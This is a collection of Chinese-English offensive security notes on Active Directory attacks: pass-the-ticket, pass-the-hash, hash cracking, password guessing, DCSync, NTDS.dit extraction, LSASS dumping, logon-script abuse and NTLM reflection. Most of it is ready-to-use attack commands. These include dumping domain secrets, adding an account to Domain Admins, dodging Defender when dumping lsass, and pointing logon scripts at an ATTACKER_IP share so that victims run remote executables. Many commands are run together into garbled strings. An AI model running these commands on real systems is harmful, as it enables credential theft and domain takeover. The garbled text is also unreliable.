Native Microsoft 工具 can then use the ticket just like usual. On UNIX-like systems, the path to the .ccache ticket to use has to be referenced in the environment variable KRB5CCNAME On Windows, once Kerberos tickets are injected, they can be used natively. On UNIX-like systems, once the KRB5CCNAME variable is exported, the ticket can be used by 工具 that support Kerberos 认证. # 命令 / 载荷 / 操作片段 # 1. Injecting the ticket 1export KRB5CCNAME=$path_to_ticket.ccache # 2. Injecting the ticket 12345# use a .kirbi filekerberos::ptt $ticket_kirbi_file# use a .ccache filekerberos::ptt $ticket_ccache_file # 3. Injecting the ticket 1Rubeus.exe ptt /ticket:"base64 | file.kirbi" # 4. Passing the ticket 1secretsdump.py -k $TARGET # 5. Passing the ticket 123netexec smb $TARGETS -k --samnetexec smb $TARGETS -k --lsanetexecETS -k --ntds # 6. Passing the ticket 123netexec smb $TARGETS -k -M lsassynetexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rdlsassy -k $TARGETS # 7. Passing the ticket 1lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt # 8. Passing the ticket 12345psexec.py -k 'DOMAIN/USER@TARGET'smbexec.py -k 'DOMAIN/USER@TARGET'wmiexec.py -k 'DOMAIN/USER@TARGET'atexec.py -k 'DOMAIN/USER@TARGET'dcomexec.py -k 'DOMAIN/USER@TARGET' # 9. Modifying the SPN 1tgssub.py -in ticket.ccache -out newticket.ccache -altservice "cifs/target" # 12. Modifying the SPN 1Rubeus.exe tgssub /altservice:cifs /ticket:"base64 | ticket.kirbi" # 工具与参考入口 ticketConverter.py Mimikatz Rubeus kerberos::ptt Impacket secretsdump NetExec BloodHound 图分析 Lsassy lsadump::dcsync sysinternals PsExec 下载 adsecurity.org the pull request # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

There are many 工具 that implement 哈希传递: Impacket scripts (Python) (psexec, smbexec, secretsdump...), NetExec (Python), FreeRDP (C), mimikatz (C), lsassy (Python), pth-toolkit (Python) and many more. === 凭据 dumping The Impacket script secretsdump (Python) has the ability to remotely dump hashes and LSA secrets from a machine (LMhash can be empty) (see dumping 凭据 from registry hives). NetExec (Python) has the ability to do it on a set of targets. The bh owned has the ability to set targets as "owned" in BloodHound 图分析 (see dumping 凭据 from registry hives). Lsassy (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in BloodHound 图分析. It works in standalone but also as a NetExec module (see dumping 凭据 from lsass process memory). # 命令 / 载荷 / 操作片段 # 1. Practice 123secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET' # 2. Practice 123netexec smb $TARGETS -u $USER -H $NThash --sam --local-authnetexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsanetexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds # 3. Practice 1234netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassynetexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rdlsassy -u $USER -H $NThash $TARGETSlsassy -d $DOMAIN -u $USER -H $NThash $TARGETS # 4. Practice 12345psexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'smbexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'wmiexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET' # 5. Practice 123netexec winrm $TARGETS -d $DOMAIN -u $USER -p $PASSWORD -x whoaminetexec smb $TARGETS --local-auth -u $USER -H $NThash -x whoaminetexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -x whoami # 6. Practice 1sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash # 7. Practice 12pth-net rpc group members "Domain admins" -U 'Domain/User%LMhash:NThash' -S $DOMAIN_CONTROLLERpth-net rpc group addmem "Domain admins" Shutdown -U 'Domain/Admin%LMhash:NThash' -S $DOMAIN_CONTROLLER # 8. Practice 1xfreerdp /u:$USER /d:$DOMAIN /pth:'LMhash:NThash' /v:$TARGET /h:1010 /w:1920 # 工具与参考入口 Impacket scripts psexec smbexec secretsdump NetExec FreeRDP mimikatz lsassy pth-toolkit BloodHound 图分析 sekurlsa::pth https://en.hackndo.com/ 哈希传递 / # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

When this information cannot be directly leveraged for higher privileges (like with 哈希传递，overpass-the - 哈希), it is required to crack it. Cracking is an operation that can be carried out through different types of attacks: Brute-force: every possibility for a given character set and a given length (i.e. aaa, aab, aac, ...) is hashed and compared against the target 哈希. Dictionary: every word of a given list (a.k.a. dictionary) is hashed and compared against the target 哈希. There are many other and more complex types of attacks (incremental, mask, rules, hybrid types, ...) but the major/core ones are the three above. One of the greatest 工具 that can be used for cracking is hashcat (C). It implements different types of attacks and many types of hashes. It has many other great features like it can crack multiple hashes at the same time and use multiple devices at once (distributed cracking networks supported too) # 命令 / 载荷 / 操作片段 # 1. Dictionnary attack 1hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file # 2. Dictionary and rules attack 1hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file # 3. Brute-force attack 123456?l = abcdefghijklmnopqrstuvwxyz?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?s = !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~?a = ?l?u?d?s?b = 0x00 - 0xff # 4. Brute-force attack 12345# Passwords are like : 1 capital letter, 3 letters, 4 numbers, 1 special charhashcat --attack-mode 3 --hash-type $number $hashes_file "?u?l?l?l?d?d?d?d?s"# Password are 8 chars-long and can be any printable char.hashcat --attack-mode 3 --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a" # 5. Brute-force attack 1hashcat --attack-mode 3 --custom-charset1 "?u" --custom-charset2 "?l?u?d" --custom-charset3 "?d" --hash-type $number $hashes_file "?1?2?2?2?3" # 6. Brute-force attack 12345# Password are up to 8 chars-long and can be any printable char.hashcat --attack-mode 3 --increment --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a"# Password are 4 to 8 chars-long and can be any printable char (mask length is 12 so that --increment-max can be upped to 12).hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file "?a?a?a?a?a?a?a?a?a?a?a?a" # 工具与参考入口 time-memory trade-off hashcat not supported weakpass packetstorm pantagrule OneRuleToRuleThemAll here John the Ripper Colab Cloud Shell penglab google-colab-hashcat cloudtopolis setting up a rig crack.sh these advice hashcat.net # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Depending on the target user (or target system), guessing can be achieved differently. There are three major types of credential guessing. Common passwords: a list of common passwords (admin, backup, qwerty, ...) are tested against one or more users. This technique is to be used with care since it can cause lockouts and a lot of noise, depending on the target organization's policies. Default passwords: certain technologies come with default passwords that are often left unchanged. This technique is similar to the "common passwords" technique, but generates less noise and has fewer chances of locking out an account. Situational guessing: there are many cases where user passwords are not common and yet easily guessable when knowing the organization's vocabulary and context. Depending on the target service, different lists of common passwords (e.g. the SecLists ones) and different 工具 can be used. Hydra (C) can be used against a lot (50+) of services like FTP, HTTP, IMAP, LDAP, MS-SQL, MYSQL, RDP, SMB, SSH and many many more. NetExec (Python) can be used against LDAP, WinRM, SMB, SSH and MS-SQL. Kerbrute (Go) and smartbrute (Python) can be used against Kerberos pre - 认证. SecLists's Default 凭据 Sheet (for 密码) ihebski's DefaultCreds 速查 (for passwords and SSH keys) # 工具与参考入口 the SecLists ones Hydra NetExec Kerbrute smartbrute SecLists's Default 凭据 Sheet ihebski's DefaultCreds 速查 username-anarchy sprayhound # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This allows attackers to retrieve the passwords in clear-text. On UNIX-like systems, this attack can be carried out with Impacket's secretsdump which has the ability to run this attack on an elevated context obtained through plaintext 密码 stuffing, 哈希传递 or pass-the-ticket. This attack can also be operated with a relayed NTLM 认证，but only if the target domain controller is vulnerable to Zerologon since the DRSUAPI always requires signing. # 命令 / 载荷 / 操作片段 # 1. Practice 12345678# using a plaintext passwordsecretsdump -outputfile 'dcsync' -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"# with Pass-the-Hashsecretsdump -outputfile 'dcsync' -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"@"$DC_HOST"# with Pass-the-TicketKRB5CCNAME=ticket.ccache secretsdump -k -no-pass -outputfile 'dcsync' -dc-ip "$DC_IP" @"$DC_HOST" # 2. Practice 12345# target vulnerable to Zerologon, dump DC's secrets onlyntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'# target vulnerable to Zerologon, dump Domain's secretsntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD' # 3. Practice 12345# Extract a specific user, in this case the krbtgtlsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt# Dump everything (printed in a short and readable format)lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /all /csv # 工具与参考入口 Impacket secretsdump mimikatz lsadump::dcsync https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/MITRE ATT&CK™ Sub-technique T1003.003 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # MITRE ATT&CK™ Sub-technique T1003.003 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 MITRE ATT&CK™ Sub-technique T1003.003 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 MITRE ATT&CK™ Sub-technique T1003.003 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：NTDS secrets、Exfiltration、AD maintenance (NTDSUtil)、Volume Shadow Copy (VSSAdmin)、NTFS structure parsing；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 NTDS secrets Exfiltration AD maintenance (NTDSUtil) Volume Shadow Copy (VSSAdmin) NTFS structure parsing Parsing NTDS Directory parsing and extraction # 核心要点 Once the secrets are extracted, they can be used for various attacks: credential spraying, stuffing, shuffling, cracking, 哈希传递，overpass-the - 哈希 or silver or golden tickets. Since the NTDS.dit is constantly used by AD processes such as the Kerberos KDC, it can't be copied like any other file. In order to exfiltrate it from a live domain controller and extract 密码 hashes from it, many techniques can be used. This attack can be carried out with Impacket's secretsdump with the -use-vss option. Additionaly, the -exec-method option can be set to smbexec, wmiexec or mmcexec to specify on which remote command execution method to rely on for the process. Invoke-NinjaCopy is a PowerShell script part of the PowerSploit suite able to "copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. This technique is stealthier than the others. With the SYSTEM hive available it is able to extract 凭据 as well: NT and LM hashes, supplemental 凭据 such as kerberos keys, cleartext passwords and 密码 哈希 history. # 命令 / 载荷 / 操作片段 # 1. AD maintenance (NTDSUtil) 1ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit # 2. Volume Shadow Copy (VSSAdmin) 1vssadmin create shadow /for=C: # 3. Volume Shadow Copy (VSSAdmin) 12copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.savecopy $ShadowCopyName\Windows\System32\config\SYSTEM C:\Windows\Temp\system.save # 4. Volume Shadow Copy (VSSAdmin) 1vssadmin delete shadows /shadow=$ShadowCopyId # 5. NTFS structure parsing 1Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save" # 6. Parsing 12secretsdump -ntds ntds.dit.save -system system.save LOCALgosecretsdump -ntds ntds.dit.save -system system.save # 7. NTDS Directory parsing and extraction 12ntdsdotsqlite ntds.dit -o ntds.sqlitentdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive # 工具与参考入口 Impacket secretsdump Invoke-NinjaCopy gosecretsdump ntdsdotsqlite # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

As of today (22/07/2020), it is the Rolls-Royce of remote lsass credential harvesting. several 认证 methods: like 哈希传递 (NTLM), or pass-the-ticket (Kerberos) Mimikatz can be used locally to extract 凭据 with sekurlsa::logonpasswords from lsass's process memory, or remotely with sekurlsa::minidump to analyze a memory dump (dumped with ProcDump for example). The legitimate tool ProcDump (from sysinternals) (下载) can be used to dump lsass's process memory. Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that. PowerSploit's exfiltration script Invoke-Mimikatz (PowerShell) can be used to extract credential material from LSASS's process memory. # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011121314# With pass-the-hash (NTLM)lsassy -u $USER -H $NThash $TARGETS# With plaintext credentialslsassy -d $DOMAIN -u $USER -H $NThash $TARGETS# With pass-the-ticket (Kerberos)lsassy -k $TARGETS# netexec Module examplesnetexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassynetexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rdnetexec smb $TARGETS -k -M lsassynetexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd # 2. Practice 123456# (Locally) extract credentials from LSASS process memorysekurlsa::logonpasswords# (Remotely) analyze a memory dumpsekurlsa::minidump lsass.dmpsekurlsa::logonpasswords # 3. Practice 1pypykatz lsa minidump lsass.dmp # 4. Practice 1procdump -accepteula -ma lsass lsass.dmp # 5. Practice 12345# Find lsass's pidtasklist /fi "imagename eq lsass.exe"# Dump lsass's process memoryprocdump -accepteula -ma $lsass_pid lsass.dmp # 6. Practice 12345# Find lsass's pidtasklist /fi "imagename eq lsass.exe"# Dump lsass's process memoryrundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full # 7. Since I didn't find practical enough resources on the Internet, feel free to reach out if you manage to 利用 this. This abuse can be carried out when controlling an object that has a GenericAll or GenericWrite over the target, or a WriteProperty premission over the target's logon script attribute (i.e. scriptPath or msTSInitialProgram). The attacker can make the user execute a custom script at logon. The Invoke-PassTheCert fork can also be used, authenticating through Schannel via PassTheCert (PowerShell). Note: the README contains the 方法论 to request a certificate using certreq from Windows (with a 密码，or an NTHash). # 命令 / 载荷 / 操作片段 # 1. Logon script 12345bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSWorkDirectory -v 'C:\'# orbloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe' # 2. Logon script 123Set-DomainObject testuser -Set @{'msTSInitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -VerboseSet-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose # 3. Logon script 1234567891011# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Overwrite the values of the 'msTSInitialProgram' and 'scriptPath' attributes for 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'msTSInitialProgram' -Value '\\ATTACKER_IP\share\run_at_logon.exe'Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'scriptPath' -Value '\\ATTACKER_IP\share\run_at_logon.exe' # 工具与参考入口 bloodyAD Set-DomainObject PowerView Invoke-PassTheCert PassTheCert README certreq # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Local NTLM Reflection via SMB Arbitrary Port 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Local NTLM Reflection via SMB Arbitrary Port 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Local NTLM Reflection via SMB Arbitrary Port 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Local NTLM Reflection via SMB Arbitrary Port 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Local NTLM Reflection via SMB Arbitrary Port、Why it works、Preconditions、Userland and internals、利用 flow；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Local NTLM Reflection via SMB Arbitrary Port Why it works Preconditions Userland and internals 利用 flow Create the attacker-controlled SMB transport Coerce a privileged service to the same UNC path Relay the privileged 认证 back to local SMB Operator notes 检测 and hardening # 核心要点 Recent Windows builds introduced SMB client support for alternative TCP ports. That feature can be abused to turn local NTLM 认证 into a SYSTEM local 权限提升 when the attacker can: Open an SMB connection to an attacker-controlled listener on a non-445 port Coerce a privileged local client to access the same SMB share path Relay the resulting local NTLM 认证 back to the machine's real SMB service This newer variant does not need a marshalled hostname. Instead it abuses two SMB client behaviours: SMB connection reuse / multiplexing, where multiple authenticated sessions can ride the same TCP connection Target supports SMB alternative ports: The attacker can run a local or remote SMB server on a chosen high port The attacker can coerce a privileged service to access a UNC path The privileged 认证 must be NTLM local 认证 Their chain did not work on Windows 11 24H2 because outbound SMB signing is enforced there by default The 绕过 still works because the TCP connection and the SMB session are separate objects Reusing the same share path is mandatory if the 利用 depends on the SMB client reusing the previously created TCP connection smbserver.py on a custom port to receive the privileged auth over the reused TCP connection # 命令 / 载荷 / 操作片段 # 1. Userland and internals 1net use \\192.168.56.3\share /tcpport:12345 # 工具与参考入口 Microsoft Learn：Configure alternative SMB ports for Windows Server 2025 Microsoft Learn：WNetAddConnection4W MSRC：CVE-2026-24294 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
